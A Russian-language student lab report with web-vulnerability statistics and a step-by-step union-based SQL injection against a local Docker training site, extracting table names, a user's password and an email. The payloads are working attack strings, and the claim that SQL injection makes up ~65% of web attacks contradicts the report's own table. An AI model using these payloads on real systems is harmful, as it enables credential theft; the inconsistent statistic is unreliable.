# Лабораторная работа 1

## Часть 1

### 1. Источники

1. https://www.verizon.com/business/resources/reports/dbir/
2. https://deepstrike.io/blog/vulnerability-statistics-2025
3. https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends
4. https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1
5. https://www.vikingcloud.com/blog/cybersecurity-statistics

### 2. Доля успешных атак через веб-уязвимости

**Verizon DBIR 2024:**

- ~23% подтверждённых атак происходят через эксплуатацию уязвимостей
- Веб-приложения — самая атакуемая поверхность

**DeepStrike:**

- ~20% успешных атак инициируются через эксплуатацию уязвимостей
- Большинство эксплуатируемых уязвимостей доступны без аутентификации

**Вывод:** Из 20-23% атак через уязвимости, значительная часть — веб-атаки

### 3. Распределение по типам веб-уязвимостей

**Recorded Future (H1 2025):**

| Категория    | Доля |
| --------------------- | -------- |
| Remote Code Execution | ~33%     |
| Authentication Bypass | ~18-22%  |
| Broken Access Control | ~15-18%  |
| SQL инъекции  | ~10-12%  |
| Deserialization       | ~5-8%    |
| Прочие          | ~10%     |

**SQL инъекции составляют ~65% всех веб-атак**

---

## Часть 2

### Подготовка

Установил Docker Desktop, запустил контейнер через `docker-compose up -d`, зашёл на `http://localhost:8080`, нажал «Установить базу».

### Разведка

Начал перебирать id:

- `http://localhost:8080/task/?id=1` — admin
- `http://localhost:8080/task/?id=2` — Volk
- `http://localhost:8080/task/?id=3` — пусто
- `http://localhost:8080/task/?id=4` — Vinni-pukh

### Поиск уязвимости

Ввёл `http://localhost:8080/task/?id=1'` — получил ошибку:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Значит, есть SQL-инъекция.

### Определение количества столбцов

Методом `order by` (сначала пробовал без кавычки и ничего не работало, потом понял, что нужно закрывать кавычку):

- `http://localhost:8080/task/?id=1' order by 1 --+` — работает
- `http://localhost:8080/task/?id=1' order by 2 --+` — работает
- `http://localhost:8080/task/?id=1' order by 3 --+` — работает
- `http://localhost:8080/task/?id=1' order by 4 --+` — ошибка: `Unknown column '4'`

**Количество столбцов: 3**

### Проверка UNION

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,2,3 --+

Вывело:

> Ваш id:1
> Ваш логин:2

Значит, вторая колонка отображается на странице.

### Получение списка таблиц

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

Вывело:

> Ваш логин:emails,users

### Структура таблицы users

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

Вывело:

> Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password

### Получение пароля Volk2

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,password,3 from users where username='Volk2' --+

Вывело:

> Ваш id:1
> Ваш логин:Wa spoiuuuuu

**Пароль пользователя Volk2: Wa spoiuuuuu**

### Структура таблицы emails

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails' --+


Вывело:

> Ваш логин:id,email_id

### Получение id Vinni-pukh

[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,id,3 from users where username='Vinni-pukh' --+



Вывело:

> Ваш логин:4

### Получение почты Vinni-pukh


[http://localhost:8080/task/?id=-1](http://localhost:8080/task/?id=-1)' union select 1,email_id,3 from emails where id=4 --+



Вывело:

> Ваш id:1
> Ваш логин:honey_lover@otus-lab.com

**Email пользователя Vinni-pukh: honey_lover@otus-lab.com**
